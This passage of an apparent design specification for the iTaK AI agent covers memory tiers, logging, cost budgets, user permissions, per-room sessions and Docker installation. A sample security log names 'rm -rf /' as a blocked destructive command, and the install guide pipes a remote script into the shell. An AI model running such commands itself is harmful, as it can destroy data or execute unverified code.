│  │  └── Recent conversation (last ~20 messages)            │ │
│  │  Size: ~2,000 tokens (always fits)                      │ │
│  └─────────────────────────────────────────────────────────┘ │
│                          ↕ auto-swap                          │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  TIER 2: RECALL MEMORY (searchable, paged in on demand) │ │
│  │  ├── MEMORY.md - accumulated knowledge, preferences     │ │
│  │  ├── Compressed conversation history                    │ │
│  │  ├── Recent task results                                │ │
│  │  └── SQLite full-text search                            │ │
│  │  Size: unlimited (paged in/out of context as needed)    │ │
│  └─────────────────────────────────────────────────────────┘ │
│                          ↕ auto-swap                          │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  TIER 3: ARCHIVAL MEMORY (deep storage, semantic search) │ │
│  │  ├── Neo4j - relationship graph (entity → entity)       │ │
│  │  ├── Weaviate - vector embeddings (semantic similarity) │ │
│  │  ├── Old conversation archives                          │ │
│  │  └── Skill execution logs, error fixes, patterns        │ │
│  │  Size: unlimited (never in context, always searched)    │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  TIER 4: EXTERNAL DATA SOURCES (RAG)                    │ │
│  │  ├── PDF documents, uploaded files                      │ │
│  │  ├── GitHub repos, code files                           │ │
│  │  ├── Web pages (cached by browser agent)                │ │
│  │  └── Attached via MCP or direct file path               │ │
│  │  Size: unlimited (chunked + embedded on demand)         │ │
│  └─────────────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────────────┘
```

### Self-Managing Memory (The MemGPT Innovation)

Instead of the developer managing what's in context, **iTaK decides for itself**:

```python
# Inner loop - runs BEFORE each LLM call:
async def memory_pressure_check(self):
    """Automatically manage memory tiers based on context pressure."""

    context_usage = self.get_context_usage()  # tokens used / tokens available

    if context_usage > 0.80:
        # PRESSURE: move old messages to Tier 2 (recall)
        old_messages = self.history.compress_oldest(target=0.60)
        await self.recall_memory.store(old_messages)
        self.log.info(f"Memory pressure: archived {len(old_messages)} messages to recall")

    if context_usage > 0.90:
        # CRITICAL: move recall items to Tier 3 (archival)
        stale_recalls = self.recall_memory.get_oldest(limit=10)
        await self.archival_memory.store(stale_recalls)
        self.recall_memory.delete(stale_recalls)
        self.log.info(f"Critical pressure: moved {len(stale_recalls)} items to archival")

# Outer loop - runs when iTaK needs information:
async def memory_search(self, query: str):
    """Search across all tiers, merging results."""
    results = []

    # Tier 1: Already in context (free - no extra search needed)

    # Tier 2: SQLite full-text search
    recall_results = await self.recall_memory.search(query)
    results.extend(recall_results)

    # Tier 3: Neo4j graph + Weaviate semantic
    graph_results = await self.neo4j.search(query)
    vector_results = await self.weaviate.search(query)
    results.extend(graph_results)
    results.extend(vector_results)

    # Rank and page best results into context
    ranked = self.memory_ranker.merge(results)
    return ranked[:5]  # Top 5 most relevant
```

### What This Gives iTaK

| Feature | Without MemGPT | With MemGPT |
|---------|---------------|-------------|
| Context window | Fixed, fills up, loses old info | Auto-manages, never loses anything |
| Old conversations | Forgotten after context fills | Compressed to Tier 2, searchable |
| Knowledge | Only what's in prompt | 4 searchable tiers, ranked by relevance |
| File handling | Load entire file into context | Chunk, embed, search on demand |
| Memory growth | Caps at context size | Unlimited - pages in what's needed |

### Integration with Existing Memory System

This doesn't replace our 4-store memory system - it **adds the management layer on top**:

```
MemGPT management layer (§19)
    ├── Tier 1: Core context (SOUL, USER, working state)
    ├── Tier 2: SQLite recall (§4 memory/sqlite_store.py)
    ├── Tier 3: Neo4j + Weaviate (§4 memory system)
    └── Tier 4: External data (MCP, file attachments)
```

---

## §24 - Logging & Observability

> *Inspired by: Agent Zero's `Log` class (thread-safe, 14 types, secret masking), Secure-OpenClaw's daily memory rotation, Mission Control's activity logging API.*

### 24.1 - Structured Log Events

Every action iTaK takes produces a typed log event. Never wonder what the agent did - everything is recorded.

**14 Event Types:**

| Type | What it captures | Example |
|------|-----------------|---------|
| `user` | User messages from any adapter | "Deploy the landing page" |
| `agent` | Agent monologue / reasoning steps | "I'll use Playwright to test..." |
| `tool` | Tool invocations + results | `code_execution_tool("pip install ...")` |
| `code_exe` | Code execution (input + stdout + exit code) | `exit_code: 0, stdout: "Success"` |
| `browser` | Browser automation actions | "Navigated to https://..." |
| `subagent` | Sub-agent spawn / completion | "Agent #1 spawned for subtask" |
| `mcp` | MCP server interactions | "Called mcp://searxng/search" |
| `error` | Errors with classification | `{"class": "network", "message": "timeout"}` |
| `memory` | Memory reads/writes across tiers | "Stored to Neo4j: 'user prefers dark mode'" |
| `response` | Final responses sent to user | "Here's your deployed URL..." |
| `progress` | Task step updates | "Step 3/5: Running tests" |
| `security` | Security scanner decisions | "Blocked: `rm -rf /` - destructive command" |
| `heartbeat` | Proactive heartbeat checks | "Checked Discord: no new messages" |
| `system` | Startup, shutdown, config changes | "iTaK started, loaded 3 adapters" |

**Log Entry Schema:**

```python
@dataclass
class LogEntry:
    timestamp: float          # Unix timestamp (time.time())
    type: str                 # One of the 14 types above
    session_id: str           # Room/channel session key
    user_id: str | None       # Who triggered this (None for system events)
    room_id: str              # Which room/channel
    agent_no: int             # Agent number (0 = main, 1+ = sub-agents)
    content: str              # Human-readable description
    metadata: dict            # Structured data (tool args, error details, etc.)
```

### 24.2 - 24-Hour Log Rotation

Logs rotate every 24 hours at midnight UTC:

```
data/logs/
├── 2026-02-12.jsonl         # Today's logs (active, append-only)
├── 2026-02-11.jsonl         # Yesterday's logs
├── 2026-02-10.jsonl         # Two days ago
├── ...                       # Kept for 30 days
└── archived/                 # After 30 days → compressed + moved here
```

**Each line is one JSON object** (JSONL format - no parsing issues, crash-safe):
```json
{"timestamp": 1707753600.0, "type": "tool", "session_id": "itak:discord:dm:776628215066132502", "user_id": "discord:776628215066132502", "room_id": "discord_dm_776628215066132502", "agent_no": 0, "content": "Executed: pip install flask", "metadata": {"exit_code": 0, "duration_ms": 1200}}
```

**Dual storage** - every log entry is written to BOTH:
1. JSONL file on disk (crash-safe, append-only, human-readable)
2. SQLite `logs` table (fast queries, FTS5 full-text search, agent self-review)

```sql
CREATE TABLE logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp REAL NOT NULL,
    type TEXT NOT NULL,
    session_id TEXT,
    user_id TEXT,
    room_id TEXT,
    agent_no INTEGER DEFAULT 0,
    content TEXT NOT NULL,
    metadata TEXT,              -- JSON blob
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_logs_type ON logs(type);
CREATE INDEX idx_logs_room ON logs(room_id);
CREATE INDEX idx_logs_time ON logs(timestamp);

-- Full-text search for log content
CREATE VIRTUAL TABLE logs_fts USING fts5(content, metadata);
```

**Archival:** logs older than 30 days are compressed (gzip) and important entries (errors, memory writes, security events) are migrated to Tier 3 (Neo4j/Weaviate) for permanent storage and semantic search.

### 24.3 - Dashboard Logs Tab

The web dashboard gets a dedicated **Logs** tab with real-time streaming:

```
┌─────────────────────────────────────────────────────────────────┐
│  📋 Logs                                            🔍 Search  │
├─────────────────────────────────────────────────────────────────┤
│  Filters: [All ▼] [Today ▼] [All Rooms ▼]    Export: [JSON|CSV]│
├─────────────────────────────────────────────────────────────────┤
│  15:04:32  🛠 tool     code_execution_tool("npm test")         │
│  15:04:31  🤖 agent    "Running tests to verify the fix..."    │
│  15:04:29  📩 user     @David: "fix the login bug"             │
│  15:04:00  💓 heartbeat Checked GitHub: 2 new issues           │
│  15:03:55  🧠 memory   Stored: "user wants tests before deploy"│
│  15:03:50  🔒 security  Blocked: attempted write to /etc/      │
│  ...                                                            │
├─────────────────────────────────────────────────────────────────┤
│  Token Costs: Today: $0.42 | This Week: $2.87 | Model: claude  │
│  Tokens In: 12,400 | Tokens Out: 3,200 | Avg Response: 1.2s   │
└─────────────────────────────────────────────────────────────────┘
```

**Features:**
- Real-time SSE/WebSocket stream (like Mission Control)
- Filter by: type, user, room, date range, severity
- Full-text search across all logs
- Token cost tracking per request (model, tokens in/out, cost estimate)
- Export logs as JSON or CSV

### 24.4 - `/logs` Command (Adapters)

Users can query logs directly from Discord/Telegram/Slack:

| Command | What it does |
|---------|-------------|
| `/logs` | Last 20 entries from current room |
| `/logs today` | Summary of today's activity |
| `/logs search <query>` | Full-text search across all logs |
| `/logs errors` | Recent errors only |
| `/logs cost` | Token spend summary (today, week, month) |

### 24.5 - Agent Self-Review (Learning from Logs)

iTaK can read its own logs to learn from past mistakes:

```python
# Extension hook: message_loop_start/log_context.py
async def inject_log_context(agent, message):
    """Before each LLM call, check if recent logs contain relevant info."""
    recent_errors = await agent.log_store.search(
        type="error",
        time_range="last_1h",
        limit=5
    )
    if recent_errors:
        agent.context.inject(
            "Recent errors (learn from these):\n" +
            "\n".join(e.content for e in recent_errors)
        )
```

**Self-healing integration (§11):** Before attempting a fix, the self-healing engine queries logs for similar past errors and their resolutions. This prevents repeating the same failed fix.

### 24.6 - Secret Masking (from Agent Zero)

All log entries pass through `mask_secrets()` before storage:

```python
def mask_secrets(obj: Any) -> Any:
    """Recursively replace API keys, tokens, passwords with ***MASKED***"""
    if isinstance(obj, str):
        for secret in get_all_secrets():
            obj = obj.replace(secret, "***MASKED***")
        return obj
    elif isinstance(obj, dict):
        return {k: mask_secrets(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [mask_secrets(item) for item in obj]
    return obj
```

Secrets are loaded from `config.json` and `.env` - any value flagged as sensitive gets masked in all log outputs.

### 24.7 - Cost Tracking & Budget Control

> *Inspired by: OpenClaw's built-in usage tracking and cost monitoring for API calls.*

**Every LLM call is tracked.** No surprises at the end of the month.

**What's tracked per request:**

```python
@dataclass
class UsageEntry:
    timestamp: float
    model: str                # "openrouter/anthropic/claude-sonnet-4-5"
    provider: str             # "openrouter", "ollama", "openai"
    tokens_in: int            # Prompt tokens
    tokens_out: int           # Completion tokens
    cost_usd: float           # Calculated from model pricing table
    user_id: str | None       # Who triggered this
    room_id: str              # Which room/channel
    purpose: str              # "chat", "utility", "browser", "embedding", "self_heal"
    duration_ms: int          # Wall-clock time
```

**Model Pricing Table (auto-updated on startup):**

> ⚠️ **These are fallback defaults only.** On startup, iTaK fetches current prices from the OpenRouter API and overrides this table. The values below are used only if the API is unreachable.

```python
# Pricing per 1M tokens (input / output)
# ⚠️ AUTO-UPDATED from OpenRouter API on startup - these are fallbacks only
MODEL_PRICING = {
    "anthropic/claude-sonnet-4-5":   {"in": 3.00, "out": 15.00},
    "anthropic/claude-3.5-haiku":    {"in": 0.80, "out": 4.00},
    "google/gemini-2.0-flash":       {"in": 0.10, "out": 0.40},
    "openai/gpt-4o":                 {"in": 2.50, "out": 10.00},
    "ollama/*":                      {"in": 0.00, "out": 0.00},  # Local = free
    # Remaining models auto-fetched from OpenRouter API on startup
}
```

**Budget Caps & Alerts:**

```json
// config.json → costs section
{
  "costs": {
    "daily_budget_usd": 5.00,
    "weekly_budget_usd": 25.00,
    "monthly_budget_usd": 80.00,
    "alert_at_percent": 80,
    "hard_stop_at_percent": 100,
    "fallback_model": "ollama/qwen2.5:7b",
    "notify_on_alert": ["discord", "dashboard"]
  }
}
```

**What happens when budget is hit:**

| Threshold | Action |
|-----------|--------|
| 80% of daily budget | ⚠️ Alert sent to owner via Discord + dashboard banner |
| 100% of daily budget | 🔄 Auto-switch to `fallback_model` (local Ollama = free) |
| Manual override | Owner can type `/budget unlock` to resume paid models |

**Per-User Cost Attribution:**

Each user's API spend is tracked separately. The Owner can see who's burning the most tokens:

```
/costs breakdown

📊 Cost Breakdown (This Week):
  David (owner):  $12.40  (62%)  - 45 requests
  Alice (sudo):    $5.20  (26%)  - 22 requests
  Bob (user):      $2.30  (12%)  - 18 requests
  ─────────────────────────────
  Total:          $19.90 / $25.00 weekly budget
```

**Dashboard Costs Tab:**

```
┌─────────────────────────────────────────────────────────────────┐
│  💰 Costs                                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Today: $2.14 / $5.00    ████████░░░░░░░░░░░░  43%              │
│  Week:  $14.30 / $25.00  ████████████░░░░░░░░  57%              │
│  Month: $42.80 / $80.00  ██████████░░░░░░░░░░  54%              │
│                                                                  │
│  ┌──────────────────┬────────┬────────┬────────┬──────────────┐ │
│  │ Model            │ Calls  │ Tok In │ Tok Out│ Cost         │ │
│  ├──────────────────┼────────┼────────┼────────┼──────────────┤ │
│  │ claude-sonnet-4-5│ 28     │ 84K    │ 12K    │ $0.43        │ │
│  │ gemini-2.0-flash │ 142    │ 320K   │ 45K    │ $0.05        │ │
│  │ ollama/qwen2.5   │ 67     │ 150K   │ 30K    │ $0.00 (free) │ │
│  └──────────────────┴────────┴────────┴────────┴──────────────┘ │
│                                                                  │
│  Avg cost/request: $0.018  │  Avg response time: 1.4s          │
│  Most expensive today: "Research latest Docker best practices"  │
│    → claude-sonnet-4-5, 12K tokens out, $0.21                   │
│                                                                  │
│  [Export CSV]  [Set Budgets]  [View History]                     │
└─────────────────────────────────────────────────────────────────┘
```

**`/costs` Command (Adapters):**

| Command | What it does |
|---------|-------------|
| `/costs` | Today's spend + budget remaining |
| `/costs week` | Weekly breakdown by model + user |
| `/costs month` | Monthly summary with trend |
| `/costs set daily 10` | Set daily budget to $10 (owner only) |
| `/budget unlock` | Override budget lock for 1 hour (owner only) |

**SQLite Cost Table:**

```sql
CREATE TABLE usage (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp REAL NOT NULL,
    model TEXT NOT NULL,
    provider TEXT NOT NULL,
    tokens_in INTEGER NOT NULL,
    tokens_out INTEGER NOT NULL,
    cost_usd REAL NOT NULL,
    user_id TEXT,
    room_id TEXT,
    purpose TEXT NOT NULL,
    duration_ms INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_usage_time ON usage(timestamp);
CREATE INDEX idx_usage_user ON usage(user_id);
CREATE INDEX idx_usage_model ON usage(model);
```

**Key design choice:** Budget caps prevent runaway costs from aggressive automation loops. If a sub-agent goes haywire spawning requests, it hits the daily cap and falls back to free local models - your wallet is always protected.

---

## §25 - Multi-User & Permissions


> *Inspired by: Secure-OpenClaw's per-platform `allowedDMs`/`allowedGroups`, OpenClaw's Docker sandbox user model, OpenClaw's Discord permission bitfield system.*

### 25.1 - Permission Levels

Three tiers of access control. Only the Owner can do everything. Regular users can chat and read, but cannot touch files or config.

| Level | Chat | Memory Read | Memory Write | Web Search | File Create/Edit | Bash/Terminal | Config | Dashboard |
|-------|------|-------------|-------------|------------|-----------------|--------------|--------|-----------|
| **Owner** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Full |
| **Sudo** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ Limited |
| **User** | ✅ | ✅ | ❌ | ✅ | ❌ | ❌ | ❌ | ❌ |

**What regular users CAN do:**
- Ask questions, have conversations
- Use web search (agent browses, returns results)
- Read from memory ("What do you know about X?")
- Get code explained, get advice

**What regular users CANNOT do:**
- Create, edit, or delete files
- Run terminal commands
- Write to memory ("Remember this...")
- Change any configuration

### 25.2 - User Registry

Users are identified by their platform IDs and mapped to permission levels:

```json
// users.json
{
  "users": [
    {
      "id": "david",
      "name": "David",
      "role": "owner",
      "platforms": {
        "discord": "776628215066132502",
        "telegram": "david_telegram_id",
        "dashboard": "admin"
      },
      "rate_limit": null
    },
    {
      "id": "alice",
      "name": "Alice",
      "role": "sudo",
      "platforms": {
        "discord": "123456789"
      },
      "rate_limit": { "messages_per_hour": 100 }
    },
    {
      "id": "bob",
      "name": "Bob",
      "role": "user",
      "platforms": {
        "discord": "987654321"
      },
      "rate_limit": { "messages_per_hour": 30 }
    }
  ],
  "unknown_user_role": "user",
  "allow_unknown_users": false
}
```

**Platform-based identification:** When a message arrives from Discord user `776628215066132502`, iTaK looks up the user registry, finds "David", and grants `owner` permissions. Unknown users get the default role or are blocked entirely.

### 25.3 - Permission Enforcement

Every tool execution goes through a permission check:

```python
# security/permissions.py

TOOL_PERMISSIONS = {
    # File operations - sudo or owner only
    "write_file": "sudo",
    "edit_file": "sudo",
    "delete_file": "sudo",
    "bash_execute": "sudo",

    # Memory writes - sudo or owner only
    "memory_save": "sudo",
    "memory_forget": "sudo",

    # Config - owner only
    "config_update": "owner",
    "user_manage": "owner",

    # Everything else - all users
    "web_search": "user",
    "memory_search": "user",
    "memory_load": "user",
    "browser_navigate": "user",
    "ask_user": "user",
}

def check_permission(user: User, tool_name: str) -> bool:
    """Check if user has permission to use this tool."""
    required_role = TOOL_PERMISSIONS.get(tool_name, "user")
    role_hierarchy = {"owner": 3, "sudo": 2, "user": 1}
    return role_hierarchy[user.role] >= role_hierarchy[required_role]
```

**Extension hook:** `tool_execution_before/permission_check.py` - runs before every tool call, returns a friendly denial message if blocked:

> "Sorry, you don't have permission to create files. Ask David to give you sudo access!"

### 25.4 - Dashboard User Management

The Owner gets a **Users** tab in the dashboard:

```
┌─────────────────────────────────────────────────────────────────┐
│  👥 Users                                      [+ Add User]     │
├─────────┬──────┬───────────┬──────────────┬───────────────────--┤
│  Name   │ Role │ Platforms │ Messages/hr  │ Last Active         │
├─────────┼──────┼───────────┼──────────────┼───────────────────--┤
│  David  │ 👑   │ 🎮 📱     │ unlimited    │ Just now            │
│  Alice  │ 🔑   │ 🎮        │ 72/100       │ 2 hours ago         │
│  Bob    │ 👤   │ 🎮        │ 15/30        │ Yesterday           │
└─────────┴──────┴───────────┴──────────────┴─────────────────────┘
```

**Actions:** Add/remove users, change roles, set rate limits, view per-user activity stats, ban users.

---

## §26 - Multi-Room / Multi-Channel

> *Inspired by: Secure-OpenClaw's session key format (`agent:<id>:<platform>:<type>:<chatId>`), Agent Zero's `AgentContext` multi-context isolation, Agent Zero's `persist_chat.py` per-context serialization.*

### 26.1 - Session Keys

Every conversation gets a unique, structured session key:

```
Format:  itak:<platform>:<room_type>:<room_id>

Examples:
  itak:discord:channel:1234567890      # Discord server channel
  itak:discord:dm:776628215066132502   # Discord DM with David
  itak:telegram:group:-1001234567      # Telegram group
  itak:telegram:dm:david_id           # Telegram DM with David
  itak:slack:channel:C0123456          # Slack channel
  itak:dashboard:session:abc-123       # Dashboard web session
```

### 26.2 - Per-Room Isolation

Each room gets its own isolated workspace. No cross-talk between channels:

```
data/rooms/
├── discord_channel_1234567890/
│   ├── history.jsonl        # Conversation transcript (append-only)
│   ├── context.json         # Active agent context / working state
│   └── tasks.json           # Room-specific task list
│
├── discord_dm_776628215066132502/
│   ├── history.jsonl
│   ├── context.json
│   └── tasks.json
│
├── telegram_dm_david_id/
│   ├── history.jsonl
│   ├── context.json
│   └── tasks.json
│
└── dashboard_session_abc123/
    ├── history.jsonl
    ├── context.json
    └── tasks.json
```

**What's isolated (per-room):**
- Conversation history (what was said)
- Agent working context (what the agent is currently doing)
- Task board (room-specific tasks)

**What's shared (across all rooms):**
- Memory tiers 1-4 (remembering things in Discord works in Telegram too)
- User registry & permissions
- Skills, tools, configuration
- Logs (tagged with `room_id` for filtering)

### 26.3 - Room Context Management

When a message arrives from a room, iTaK loads that room's context:

```python
async def handle_message(platform: str, room_id: str, user_id: str, message: str):
    """Route incoming message to the correct room context."""
    session_key = f"itak:{platform}:{room_type}:{room_id}"

    # Load or create room context
    room = RoomManager.get_or_create(session_key)

    # Load conversation history (last ~20 messages + summary of older)
    room.load_history()

    # Resolve user permissions
    user = UserRegistry.resolve(platform, user_id)

    # Execute agent loop in this room's context
    response = await agent.run(
        message=message,
        context=room.context,
        user=user,
        session_key=session_key
    )

    # Save updated context + append to history
    room.save()

    return response
```

### 26.4 - Cross-Room Memory

**Memory is shared, context is not:**

- "Remember this" in Discord #general → stored in shared memory (Tier 2/3/4)
- The agent in Telegram DM can search and find that memory
- Agent can say: *"In Discord #general, you mentioned you prefer dark mode - I'll apply that here too."*

**Room-specific context** stays in the room:
- Tasks started in one room don't bleed into another
- The agent doesn't confuse who asked what in which channel

### 26.5 - Dashboard Rooms View

The dashboard shows all active rooms:

```
┌─────────────────────────────────────────────────────────────────┐
│  🏠 Rooms                                                       │
├──────────────────────┬──────────┬──────────┬───────────────────--┤
│  Room                │ Platform │ Users    │ Last Message        │
├──────────────────────┼──────────┼──────────┼───────────────────--┤
│  DM: David           │ 🎮       │ 1        │ "fix the login" 2m  │
│  #general            │ 🎮       │ 3        │ "thanks!" 15m       │
│  Group: Tech         │ 📱 TG    │ 5        │ "what's the ETA?" 1h│
│  Dashboard Session   │ 🌐       │ 1        │ "run tests" 3h      │
└──────────────────────┴──────────┴──────────┴─────────────────────┘
```

Click any room to view its full conversation, tasks, and context.

### 26.6 - Presence & Typing Indicators

> *Inspired by: OpenClaw's presence system - showing the agent's real-time status across all connected channels.*

When iTaK is processing a message, every adapter broadcasts a **typing indicator** so the user knows work is happening:

```python
# core/presence.py

class PresenceManager:
    """Broadcast agent status across all active adapters."""

    STATES = {
        "idle":       "💤",   # Waiting for input
        "thinking":   "🧠",   # LLM is generating
        "tool_use":   "🔧",   # Executing a tool (bash, browser, etc.)
        "searching":  "🔍",   # Web search or memory retrieval
        "writing":    "✍️",   # Writing/editing files
        "error":      "❌",   # Something went wrong
    }

    async def set_state(self, state: str, detail: str = ""):
        """Update presence across all connected adapters."""
        for adapter in self.active_adapters:
            await adapter.send_presence(state, detail)

    async def typing_context(self, room_id: str):
        """Context manager - shows typing while agent works."""
        # Discord: trigger typing indicator
        # Telegram: send ChatAction.TYPING
        # Dashboard: update status badge in real-time via SSE
        # Slack: show typing indicator in thread
```

**Per-adapter implementation:**

| Adapter | Typing Indicator | Status Display |
|---------|-----------------|----------------|
| Discord | `channel.trigger_typing()` (native) | Bot status: "🧠 Thinking..." |
| Telegram | `ChatAction.TYPING` (native) | - |
| Slack | Thread typing indicator | App Home status update |
| Dashboard | Animated pulse dot + status text | Header: "🔧 Running bash..." |

**Auto-timeout:** If the agent takes >60 seconds, presence auto-updates to `"⏳ Still working..."` to reassure the user it hasn't crashed.

### 26.7 - Media Pipeline

> *Inspired by: OpenClaw's media handling - images, audio, video, and files flow through a unified pipeline across all channels.*

iTaK handles **inbound and outbound media** through a unified pipeline that normalizes content across adapters:

#### Inbound (User → Agent)

```python
# core/media.py

class MediaPipeline:
    """Normalize media from any adapter into a standard format."""

    SUPPORTED_TYPES = {
        "image":    [".png", ".jpg", ".jpeg", ".gif", ".webp"],
        "audio":    [".mp3", ".ogg", ".wav", ".m4a"],
        "video":    [".mp4", ".webm", ".mov"],
        "document": [".pdf", ".txt", ".md", ".csv", ".json", ".py", ".js"],
    }

    async def process_inbound(self, attachment: Attachment) -> MediaItem:
        """Download, classify, and store incoming media."""
        # 1. Download to data/rooms/{room_id}/media/
        local_path = await self.download(attachment)

        # 2. Classify type
        media_type = self.classify(local_path)

        # 3. Extract content based on type
        if media_type == "image":
            description = await self.describe_image(local_path)   # Vision model
        elif media_type == "audio":
            transcript = await self.transcribe(local_path)        # Whisper
        elif media_type == "document":
            content = await self.extract_text(local_path)         # PDF/text parser

        # 4. Return normalized MediaItem for agent context
        return MediaItem(
            type=media_type,
            path=local_path,
            extracted_content=description or transcript or content,
            original_filename=attachment.filename,
        )
```

#### Outbound (Agent → User)

When the agent generates media (charts, images, code files), it's sent through the correct adapter API:

| Media Type | Discord | Telegram | Slack | Dashboard |
|-----------|---------|----------|-------|-----------|
| Image | `file=discord.File()` | `send_photo()` | `files_upload_v2()` | `<img>` inline |
| Audio | File attachment | `send_voice()` | File attachment | `<audio>` player |
| Code file | Code block + attach | Document attach | Snippet | Syntax-highlighted |
| PDF/Doc | File attachment | `send_document()` | File attachment | Download link |

#### Storage

```
data/rooms/{room_id}/media/
├── img_2026-02-12_001.png     # User-sent screenshot
├── audio_2026-02-12_002.ogg   # Voice message transcript
├── chart_2026-02-12_003.png   # Agent-generated chart
└── manifest.json              # Index of all media with metadata
```

**Size limits:** Configurable per-adapter (Discord: 25MB, Telegram: 50MB, Dashboard: unlimited). Oversized files are stored locally with a download link sent instead.

---

## §27 - Conversation Continuity

> *Inspired by: Secure-OpenClaw's JSONL transcript system (append-only, per-session), Agent Zero's `persist_chat.py` (full context serialization/deserialization with agent hierarchy), Mission Control's SSE real-time event stream.*

### 27.1 - Never Lose a Conversation

Every message - user, agent, tool call, system event - is persisted the moment it happens:

```python
async def append_transcript(room_id: str, entry: dict):
    """Append to transcript file with crash-safe fsync."""
    filepath = f"data/rooms/{room_id}/history.jsonl"
    line = json.dumps({
        "timestamp": time.time(),
        "role": entry["role"],          # 'user', 'assistant', 'tool', 'system'
        "content": entry["content"],
        "user_id": entry.get("user_id"),
        "tool_name": entry.get("tool_name"),
        "metadata": entry.get("metadata", {})
    }) + "\n"

    with open(filepath, "a") as f:
        f.write(line)
        f.flush()
        os.fsync(f.fileno())  # Crash-safe: data hits disk immediately

    # Also store in SQLite for querying
    await db.execute(
        "INSERT INTO conversations (room_id, user_id, role, content, tool_name, metadata) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        [room_id, entry.get("user_id"), entry["role"], entry["content"],
         entry.get("tool_name"), json.dumps(entry.get("metadata", {}))]
    )
```

### 27.2 - Session Resumption (Crash Recovery)

If iTaK crashes or restarts mid-conversation:

1. On startup, scan `data/rooms/` for all active room folders
2. Reload `context.json` for each room (what was the agent doing?)
3. Reload last N entries from `history.jsonl` (what was said?)
4. Inject a summary message into the agent's context:

```
[System] You were restarted. Before the restart, you were in room
"discord_dm_776628215066132502" working on: "deploying the landing page".
The last user message was: "fix the CSS on mobile". Resume where you left off.
```

This integrates with **§13 Crash Resilience** - the checkpoint system ensures tool execution state is preserved.

### 27.3 - Cross-Adapter Continuity

Same user across multiple platforms → same memory, different rooms:

```
David on Discord: "Remember, I prefer dark mode."
  → Stored in shared memory

David on Telegram: "What's my UI preference?"
  → Agent searches memory, finds: "David prefers dark mode"
  → Response: "You mentioned on Discord that you prefer dark mode!"
```

**Cross-room search command:**

```
David: "What did I ask you earlier on Discord?"
  → Agent searches ALL rooms where user_id matches David
  → Returns: "In Discord DM, you asked about fixing the login bug."
```

### 27.4 - Conversation Archival

Conversations grow large over time. iTaK manages this automatically:

| Age | Where it lives | How it's accessed |
|-----|---------------|-------------------|
| Today | JSONL file + SQLite (hot) | Direct read, full context |
| 1-7 days | SQLite (warm) | Search + load on demand |
| 7-30 days | Compressed JSONL + SQLite | Search, summary only |
| 30+ days | Neo4j + Weaviate (cold) | Semantic search, no raw messages |

**Auto-summarization:** Conversations older than 7 days get auto-summarized (using the utility LLM) before archival. The summary + key facts move to Tier 3, raw messages are compressed.

### 27.5 - Conversations Database Table

```sql
CREATE TABLE conversations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    room_id TEXT NOT NULL,
    user_id TEXT,
    role TEXT NOT NULL,          -- 'user', 'assistant', 'tool', 'system'
    content TEXT NOT NULL,
    tool_name TEXT,              -- If role='tool', which tool was called
    metadata TEXT,               -- JSON blob (tool args, model used, tokens, etc.)
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    archived BOOLEAN DEFAULT FALSE
);

CREATE INDEX idx_conv_room ON conversations(room_id);
CREATE INDEX idx_conv_user ON conversations(user_id);
CREATE INDEX idx_conv_time ON conversations(created_at);
CREATE INDEX idx_conv_role ON conversations(role);
```

---

## §28 - Installation & First-Launch

> *Inspired by: Agent Zero's 2-command Docker quickstart, `A0_SET_` env var automation, backup/restore update flow, per-OS installation guides with screenshots.*

### 28.1 - Zero-Experience Install

**Design principle:** If you can copy-paste 2 lines into a terminal, you can run iTaK.

**The entire install:**

```bash
# Step 1: Pull the image
docker pull itak/agent:latest

# Step 2: Run it
docker run -p 50001:80 -v ~/itak-data:/app/data itak/agent

# Step 3: Open http://localhost:50001 - done!
```

**That's it.** The web UI opens, the setup wizard walks you through everything else.

### 28.2 - OS-Specific Guides

Each operating system gets its own step-by-step guide:

**Windows:**
1. Download Docker Desktop → install → launch
2. Open PowerShell → paste 2 commands above
3. Open browser → http://localhost:50001

**macOS:**
1. `brew install --cask docker` OR download Docker Desktop
2. Open Terminal → paste 2 commands above
3. Open browser → http://localhost:50001

**Linux / VPS:**
1. `curl -fsSL https://get.docker.com | sh`
2. Paste 2 commands above
3. Access via http://your-ip:50001

Each guide includes screenshots and links to video walkthroughs.

### 28.3 - First-Launch Setup Wizard

On first launch, the web UI shows a guided wizard:

```
┌─────────────────────────────────────────────────┐
│            🚀 Welcome to iTaK!                  │
│                                                  │
│  Let's get your AI agent set up.                │
│  This takes about 2 minutes.                    │
│                                                  │
│  Step 1 of 5:                                   │
│  "What should I call your agent?"               │
│                                                  │
│  Agent Name: [iTaK________________]             │
│                                                  │
│                              [Next →]            │
└─────────────────────────────────────────────────┘
```

| Wizard Step | What it does |
|------------|-------------|
| 1. Welcome | Choose agent name, select personality tone |
| 2. Connect LLM | Pick provider (OpenRouter / Ollama / OpenAI / Anthropic), paste API key. If Ollama selected → auto-detect local models |
| 3. Platform | Enable Discord / Telegram / Slack / Dashboard-only. Paste bot tokens with guided "How to create a bot" links |
| 4. Optional Services | Enable/disable Neo4j, Weaviate, SearXNG - Docker auto-pulls if enabled |
| 5. Ready! | Summary page showing what's configured, link to dashboard |

### 28.4 - docker-compose.yml (Full Stack)

For users who want the full stack with optional services:

```yaml
services:
  itak:
    image: itak/agent:latest
    ports: ["50001:80"]
    volumes: ["./data:/app/data"]
    env_file: .env

  # Optional - uncomment to enable:
  # neo4j:
  #   image: neo4j:5
  #   ports: ["7687:7687"]
  #   environment:
  #     NEO4J_AUTH: neo4j/changeme
  #   volumes: ["./data/neo4j:/data"]
  #
  # weaviate:
  #   image: semitechnologies/weaviate:latest
  #   ports: ["8080:8080"]
  #
  # searxng:
  #   image: searxng/searxng:latest
  #   ports: ["8888:8080"]
```

### 28.5 - One-Click Updates

